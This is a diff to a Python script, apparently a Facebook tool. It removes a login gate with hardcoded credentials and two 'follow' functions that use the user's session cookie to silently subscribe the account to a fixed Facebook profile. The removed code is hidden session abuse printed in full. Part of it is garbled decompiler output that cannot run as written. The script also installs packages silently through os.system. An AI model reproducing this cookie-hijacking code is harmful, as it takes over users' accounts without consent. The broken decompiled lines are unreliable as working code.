@@ -40,44 +40,6 @@ except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
     
-import getpass
-
-attemps = 0
-
-while attemps < 12345677901:
-    username = input('\033[1;92mUser Name:\033[1;37m ')
-    password = input('\033[1;92mPassword:\033[1;37m ')
-
-    if username == 'gsxd143' and password == 'gsxd143':    	
-        print('\033[1;92mYou have successfully logged in.')
-        break
-    else:
-        print('\033[91;1mIncorrect Please Trying ')
-        #def pw():
-        attemps += 1
-        continue
-os.system('clear')
-
-def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100000160984736', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://free.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
-            
-
-def follow(self,coki):
-        session = requests.Session()
-        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100000160984736",cookies={"cookie":coki}).text,"html.parser")
-        for x in r.find_all("a",href=True):
-            if "/a/subscribe.php" in x.get('href'):
-                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
-        if '/a/subscribe.php' in str(r):
-            b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
-            session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
-        else:
-            pass
- 
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
